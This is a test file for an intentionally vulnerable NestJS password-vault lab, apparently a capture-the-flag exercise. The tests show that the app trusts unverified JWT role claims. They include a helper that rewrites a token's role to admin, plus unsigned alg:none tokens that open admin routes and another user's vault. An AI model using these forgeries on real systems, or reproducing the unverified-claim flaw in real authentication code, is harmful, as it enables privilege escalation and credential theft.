// HTTP-level tests with the data layer mocked out (no Postgres needed).
//
// They pin the behaviour of the lab end to end through the real Nest app:
//   - the legitimate paths (member login, team vault, admin reads the console),
//   - the denials (no token, member on an admin route),
//   - the exploit (a token whose role was rewritten, or an unsigned one, opens
//     the admin routes — CWE-284), and
//   - the contrast (the audit route verifies the signature and refuses it).
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import request from 'supertest';
import type { INestApplication } from '@nestjs/common';
import { hashPassword } from '../src/auth.js';
import { issueToken } from '../src/auth/token.js';

const FLAG = 'FLAG{VAULTPASS_FORGED_THE_CLAIM}';

const alice = {
  id: 1,
  username: 'alice',
  passwordHash: hashPassword('password123'),
  displayName: 'Alice Martins',
  role: 'member',
};
const bob = {
  id: 2,
  username: 'bob',
  passwordHash: hashPassword('pw'),
  displayName: 'Bob Keller',
  role: 'admin',
};

vi.mock('../src/auth/users.service.js', () => ({
  findUserByUsername: async (name: string) => [alice, bob].find((u) => u.username === name),
}));

vi.mock('../src/vault/vault.service.js', () => ({
  listTeamCredentials: async () => [{ id: 1, visibility: 'team', name: 'Office Wi-Fi' }],
  listPersonalCredentials: async (ownerId: number) => [
    { id: ownerId + 4, visibility: 'personal', ownerId, name: `personal of ${ownerId}` },
  ],
}));

vi.mock('../src/admin/admin.service.js', () => ({
  listUsers: async () => [{ id: 1, username: 'alice', role: 'member' }],
  listAllCredentials: async () => [
    { id: 8, visibility: 'admin', name: 'Production database' },
    { id: 10, visibility: 'admin', name: 'Root recovery key', secret: FLAG },
  ],
  listAuditEvents: async () => [{ id: 1, actor: 'bob', action: 'credential.read' }],
}));

const { createApp } = await import('../src/main.js');

let app: INestApplication;
const http = () => request(app.getHttpServer());

beforeAll(async () => {
  app = await createApp();
  await app.init();
});

afterAll(async () => {
  await app?.close();
});

const b64 = (o: unknown) => Buffer.from(JSON.stringify(o)).toString('base64url');
const bearer = (t: string) => ({ Authorization: `Bearer ${t}` });

function forgeRole(token: string, role: string): string {
  const [h, p, s] = token.split('.');
  const payload = { ...JSON.parse(Buffer.from(p!, 'base64url').toString()), role };
  return `${h}.${b64(payload)}.${s}`;
}

describe('public surface', () => {
  it('serves the health check', async () => {
    const res = await http().get('/healthz');
    expect(res.status).toBe(200);
    expect(res.text).toBe('ok');
  });

  it('rejects a login without credentials', async () => {
    expect((await http().post('/api/login').send({})).status).toBe(400);
  });

  it('rejects a wrong password and an unknown user', async () => {
    const bad = await http().post('/api/login').send({ username: 'alice', password: 'nope' });
    const ghost = await http().post('/api/login').send({ username: 'zed', password: 'x' });
    expect(bad.status).toBe(401);
    expect(ghost.status).toBe(401);
  });
});

describe('legitimate paths', () => {
  it('logs alice in and returns a token with her member role', async () => {
    const res = await http()
      .post('/api/login')
      .send({ username: 'alice', password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.body.user).toMatchObject({ id: 1, username: 'alice', role: 'member' });
    const me = await http().get('/api/me').set(bearer(res.body.token));
    expect(me.body).toEqual({ id: 1, username: 'alice', role: 'member' });
  });

  it('lets a member read the team vault and her own personal items', async () => {
    const t = issueToken(alice);
    expect((await http().get('/api/vault').set(bearer(t))).status).toBe(200);
    const mine = await http().get('/api/vault/personal').set(bearer(t));
    expect(mine.body.credentials[0].ownerId).toBe(1);
  });

  it('lets the real admin read the console, audit trail included', async () => {
    const t = issueToken(bob);
    for (const path of ['users', 'credentials', 'audit']) {
      expect((await http().get(`/api/admin/${path}`).set(bearer(t))).status).toBe(200);
    }
  });
});

describe('denials', () => {
  it.each(['/api/me', '/api/vault', '/api/vault/personal', '/api/admin/users'])(
    'requires a token on %s',
    async (path) => {
      expect((await http().get(path)).status).toBe(401);
    },
  );

  it('refuses a member on every admin route', async () => {
    const t = issueToken(alice);
    for (const path of ['users', 'credentials', 'audit']) {
      expect((await http().get(`/api/admin/${path}`).set(bearer(t))).status).toBe(403);
    }
  });

  it('refuses a malformed token', async () => {
    expect((await http().get('/api/vault').set(bearer('garbage'))).status).toBe(401);
  });
});

describe('the lab: the role claim is trusted without verification (CWE-284)', () => {
  it('opens the admin credentials with a payload rewritten to role=admin', async () => {
    const forged = forgeRole(issueToken(alice), 'admin');
    const res = await http().get('/api/admin/credentials').set(bearer(forged));
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.body)).toContain(FLAG);
  });

  it('opens the admin routes with an unsigned alg:none token', async () => {
    const none = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: '1', username: 'alice', role: 'admin' })}.`;
    expect((await http().get('/api/admin/users').set(bearer(none))).status).toBe(200);
  });

  it('lets a forged sub read another account’s personal items', async () => {
    const none = `${b64({ alg: 'none' })}.${b64({ sub: '2', username: 'bob', role: 'member' })}.`;
    const res = await http().get('/api/vault/personal').set(bearer(none));
    expect(res.body.credentials[0].ownerId).toBe(2);
  });

  it('contrast: the audit route verifies the signature and refuses the forgery', async () => {
    const forged = forgeRole(issueToken(alice), 'admin');
    expect((await http().get('/api/admin/audit').set(bearer(forged))).status).toBe(401);
    const none = `${b64({ alg: 'none' })}.${b64({ sub: '2', username: 'bob', role: 'admin' })}.`;
    expect((await http().get('/api/admin/audit').set(bearer(none))).status).toBe(401);
  });
});
